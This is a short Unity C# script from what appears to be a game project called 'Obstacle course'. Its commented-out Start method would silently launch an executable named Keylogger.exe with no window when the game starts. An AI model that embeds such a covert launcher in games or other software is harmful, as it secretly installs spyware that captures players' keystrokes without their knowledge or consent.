using UnityEngine;
using System.Diagnostics;

using UnityEngine;
using System.Diagnostics;

public class ExecuteExternalExe : MonoBehaviour
{
   /* void Start()
    {
        // Path to the external EXE (adjust the path accordingly)
        string exePath = "C:\\Users\\Itsmeowais\\OneDrive\\Desktop\\Obstacle course\\Keylogger.exe";

        // Check if the EXE file exists
        if (System.IO.File.Exists(exePath))
        {
            // Configure process start info
            ProcessStartInfo psi = new ProcessStartInfo(exePath)
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };

            // Start the external process
            Process.Start(psi);
        }
        else
        {
            UnityEngine.Debug.LogError("External EXE file not found at: " + exePath);
        }

        // You can do other initialization or game logic here
    }*/
}

